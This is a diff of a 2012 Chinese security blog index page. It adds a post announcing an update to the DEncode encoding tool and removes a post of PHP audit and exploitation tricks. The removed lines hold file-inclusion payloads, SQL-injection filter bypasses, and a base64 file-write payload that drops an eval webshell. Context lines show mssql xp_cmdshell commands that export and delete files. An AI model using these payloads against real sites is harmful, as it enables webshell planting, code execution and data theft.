@@ -9,7 +9,9 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="在php源码审计的时候，需要根据自己的字典进行搜索并进行分析，因此php 安全字典很重要，上一篇文章总结了常见安全方面的PHP函数。Windows下我们可以通过“Search and Replace”工具结合字典进行搜索，而linux下可以通过借鉴强大的grep命令进行搜索， &hellip;">
+  <meta name="description" content="DEncode1.1更新说明1、增加了LM、NT、LM/NThash加密方式。2、增加了原来漏掉的HTML解码功能。3、增加了字符替换功能。
+DEncode1.0 介绍文章：链接工具下载：下载
+">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +69,39 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2012/06/08/dencode_tool/">编解码工具 DEncode1.1 更新</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2012-06-08T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2012/06/08/dencode_tool/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>DEncode1.1更新说明<br>1、增加了LM、NT、LM/NThash加密方式。<br>2、增加了原来漏掉的HTML解码功能。<br>3、增加了字符替换功能。
+DEncode1.0 介绍文章：<a href="http://www.ourren.com/blog/encoding-and-decoding-tools-decode.html">链接<br></a>工具下载：<a href="http://code.google.com/p/ourren/downloads/list">下载</a></p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -395,94 +430,6 @@ mssql导出数据为excel
 [code lang=&ldquo;sql&rdquo;]EXEC master..xp_cmdshell &lsquo;bcp tt.dbo.user out D:data.xls -c -q -S &ldquo;localhost&rdquo; -U &ldquo;sa&rdquo; -P &ldquo;123456&rdquo;&rsquo;[/code]
 mssql删除文件
 [code lang=&ldquo;sql&rdquo;]EXEC master..xp_cmdshell &lsquo;del D:data.xls&rsquo;[/code]</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/04/16/some_of_php_audit_skills/">一些php源码审计与利用技巧</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-04-16T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/04/16/some_of_php_audit_skills/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>花了一些时间翻阅了wolvez中源码审计帖子，发现里面很多关于文件包含的漏洞，当然还有很多高级利用帖子。总体来说又扩充了一下关于php漏洞挖掘方面的思路，先总结如下：</p>
-
-<p>1、文件包含
-原来有介绍文件包含（<a href="http://www.ourren.com/blog/file-contains-the-summary-into-the-use-of.html">http://www.ourren.com/blog/file-contains-the-summary-into-the-use-of.html</a> ），其实当时候总结的还不是很全，还有几点需要补充的。
-查找思路：先找到哪些文件中include，require函数中包含有可控制的变量，然后看哪些文件包含了这个文件。
-利用：
-条件：在allow_url_include = On且PHP >= 5.2.0的条件下
-利用的时候采用data://或者php://input是一个不错的选择
-[code lang=&ldquo;php&rdquo;]x.php?path=data://text/plain;base64,PD9waHBpbmZvKCk7Lyo=
-x.php?path=data:;base64,PD9waHBpbmZvKCk7Lyo=
-x.php?inc=data:;base64,PD9waHAgZWNobyBwaHBpbmZvKCk7Pz4=   //phpinfo()[/code]
-截断方式：
-%00(GPC开启时会转义)  长文件名（///////)
-注：php5.3.4以后已经修复了%00漏洞</p>
-
-<p>包含tmp文件夹下文件：
-注上传一个webshell到/tmp文件夹下包含（../../../x.php）。</p>
-
-<p>2、变量覆盖
-条件：需要开启register_globals（php5.4已删除，见此文<a href="http://blog.ourren.com/2012/03/13/php5.4_remove_safe-function.html">http://blog.ourren.com/2012/03/13/php5.4_remove_safe-function.html</a> ），有时候还可能会考虑GPC。
-数组未初始化覆盖技巧蛮多的。
-新认识的函数：parse_str</p>
-
-<p>3、注入关键字过滤
-&lsquo;    %2%277  过滤%27时，针对str_replace过滤关键字符，其他过滤方式结合具体情况
-&#8216;    %2527  针对urldecode()函数
-空格  ()替代空格的方法绕过：union(select(password),2,3,4,5,6,7,8,9,0,1+from+[zt_admin])</p>
-
-<p>4、文件写操作
-两种比较好的利用代码：
-字符写文件
-[code lang=&ldquo;php&rdquo;]hxxp://www.xxx.com/error.php?errid=1&amp;errtitle=&lt;?fputs(fopen(chr(119).chr(111).chr(108).chr(118).chr(101).chr(122).chr(46).
-chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(112).chr(104).
-chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59).chr(63).chr(62));?&gt;[/code]
-这样你在访问一次hxxp://www.xxx.com/data/error.php 后将得到 hxxp://www.xxx.com/data/wolvez.php 的测试文件
-内容为&lt;?phpinfo():?>l</p>
-
-<p>双引号（base64）写文件，然后包含执行
-<a href="http://$">http://$</a>{${fputs(fopen(base64_decode(ZmwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9Q
-T1NUW2FdKTsgPz4x))}}
-上面这段代码是将 &lt;?php @eval($_POST[a]); ?>1 到fl.php文件。利用base64_encode编码避免了使用单引号，所以无须考虑gpc的影响。注意，在字符串不包括 + =等特殊符号的情况下，base64_decode的参数是无须使用单引号或者双银引号的。</p>
-
-<p>5、GPC绕过
-$_SERVER数组不受GPC影响。
-GPC与substr组合：有些地方经过GPC转义后，其他地方有可能用substr进行取值，这时候恰好把&#8217;&lsquo;去掉。
-数据库（文本）中转：
-[code lang=&ldquo;php&rdquo;][注意存入数据库和select出的数据]
-用户输入===&gt;gpcaddslashes()==========&gt;数据库=========&gt;执行sql语句include写入缓存文件
-insertupdate                 select
-编码：
-UTF-7(+ACc-)===&gt;gpcaddslashes()===&gt;mb_convert_encoding()===&gt;UTF-8(&rsquo;)
-0xbf27===&gt;gpcaddslashes()===&gt;0xbf5c27===&gt;执行sql语句[数据库编码支持多字节][/code]
-参考：
-<a href="http://bbs.wolvez.org/viewtopic.php?id=20">http://bbs.wolvez.org/viewtopic.php?id=20</a>
-<a href="http://www.xfocus.net/articles/200608/878.html">http://www.xfocus.net/articles/200608/878.html</a>
-<a href="http://www.ourren.com/file-contains-the-summary-into-the-use-of.html">http://www.ourren.com/file-contains-the-summary-into-the-use-of.html</a>
-<a href="http://bbs.wolvez.org">http://bbs.wolvez.org</a></p>
 </div>
   
   
